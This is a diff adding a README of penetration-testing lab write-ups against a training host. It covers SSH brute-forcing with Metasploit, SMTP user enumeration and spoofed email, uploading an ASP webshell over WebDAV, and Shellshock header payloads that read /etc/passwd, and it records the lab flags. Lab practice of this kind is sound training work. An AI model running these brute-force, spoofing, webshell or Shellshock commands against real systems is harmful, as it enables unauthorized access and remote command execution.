@@ -854,3 +854,211 @@ Successfully explored MySQL enumeration using relevant Metasploit modules.
 - [Metasploit Modules](https://www.rapid7.com/db/)
 - [MySQL](https://www.mysql.com/)
 
+# 🛡️ Penetration Testing Labs Report
+
+This repository documents steps and findings from various penetration testing labs including SSH Login, SMTP Enumeration, IIS WebDAV, and Shellshock vulnerabilities.
+
+---
+
+## 🔐 Lab - SSH Login
+
+### Steps:
+
+**1. Scan SSH Version**
+```bash
+msfconsole
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS demo.ine.local
+exploit
+```
+
+**2. Brute-force SSH Login**
+```bash
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS demo.ine.local
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit
+```
+
+**3. Get Sessions and Find Flag**
+```bash
+sessions
+sessions -i 1
+find / -name "flag"
+cat /flag
+```
+
+### 🏁 Flag:
+```
+eb09cc6f1cd72756da145892892fbf5a
+```
+
+### 🔗 References:
+- [SSH](https://en.wikipedia.org/wiki/Secure_Shell)
+- [SSH Login Module](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login)
+
+---
+
+## 📧 Lab - SMTP Enumeration
+
+**1. Get SMTP Server Info**
+```bash
+nmap -sV --script banner demo.ine.local
+```
+
+**2. Connect via Netcat**
+```bash
+nc demo.ine.local 25
+```
+
+**3. Check Users**
+```bash
+VRFY admin@openmailbox.xyz
+VRFY commander@openmailbox.xyz
+```
+
+**4. EHLO/HELO Test**
+```bash
+telnet demo.ine.local 25
+HELO attacker.xyz
+EHLO attacker.xyz
+```
+
+**5. User Enumeration (smtp-user-enum)**
+```bash
+smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
+```
+
+**6. Metasploit SMTP Enumeration**
+```bash
+msfconsole -q
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS demo.ine.local
+exploit
+```
+
+**7. Send Fake Mail via Telnet**
+```bash
+telnet demo.ine.local 25
+HELO attacker.xyz
+mail from: admin@attacker.xyz
+rcpt to: root@openmailbox.xyz
+data
+Subject: Hi Root
+
+Hello,
+This is a fake mail sent using telnet command.
+From, Admin
+.
+```
+
+**8. Send Fake Mail via `sendemail`**
+```bash
+sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
+```
+
+### 🔗 References:
+- [Postfix](http://www.postfix.org/)
+- [smtp-user-enum Tool](https://tools.kali.org/information-gathering/smtp-user-enum)
+- [Metasploit SMTP Enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum)
+
+---
+
+## 💻 Lab - Windows IIS Server DAVtest
+
+**1. Nmap Scan**
+```bash
+nmap demo.ine.local
+```
+
+**2. Discover Web Directories**
+```bash
+nmap --script http-enum -sV -p 80 demo.ine.local
+```
+
+**3. Run DAVTest**
+```bash
+davtest -url http://demo.ine.local/webdav
+davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
+```
+
+**4. Upload Backdoor Using Cadaver**
+```bash
+cadaver http://demo.ine.local/webdav
+# Login: bob / password_123321
+put /usr/share/webshells/asp/webshell.asp
+ls
+```
+
+**5. Access Webshell via Browser**
+- Authenticated Access:
+  ```
+  http://demo.ine.local/webdav/webshell.asp
+  ```
+- Command Execution:
+  ```
+  http://demo.ine.local/webdav/webshell.asp?cmd=whoami
+  ```
+
+**6. Read the Flag**
+```text
+http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
+```
+
+### 🏁 Flag:
+```
+0cc175b9c0f1b6a831c399e269772661
+```
+
+### 🔗 References:
+- [DAVTest](https://github.com/cldrn/davtest)
+- [Cadaver](https://github.com/grimneko/cadaver)
+
+---
+
+## 🐚 Lab - Shellshock (CVE-2014-6271)
+
+**1. Run Nmap Scan**
+```bash
+nmap demo.ine.local
+```
+
+**2. Detect Shellshock**
+```bash
+nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
+```
+
+**3. Browse Target Web App**
+- URL:
+  ```
+  http://demo.ine.local
+  ```
+
+**4. Use Burp Suite for Exploit**
+- Intercept `/gettime.cgi` request
+- Modify User-Agent with payload:
+```bash
+() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+() { :; }; echo; echo; /bin/bash -c 'id'
+() { :; }; echo; echo; /bin/bash -c 'ps -ef'
+```
+
+### 🔗 References:
+- [Shellshock Exploit Repo](https://github.com/opsxcq/exploit-CVE-2014-6271)
+
+---
+
+## ✅ Conclusion
+
+These labs explored:
+- Brute-forcing SSH credentials using Metasploit
+- Enumerating users and sending spoofed emails via SMTP
+- Exploiting insecure WebDAV services on IIS using DAVTest & Cadaver
+- Performing Shellshock exploitation using crafted HTTP headers
+
+Practice with these techniques sharpens real-world penetration testing skills.
+
+---
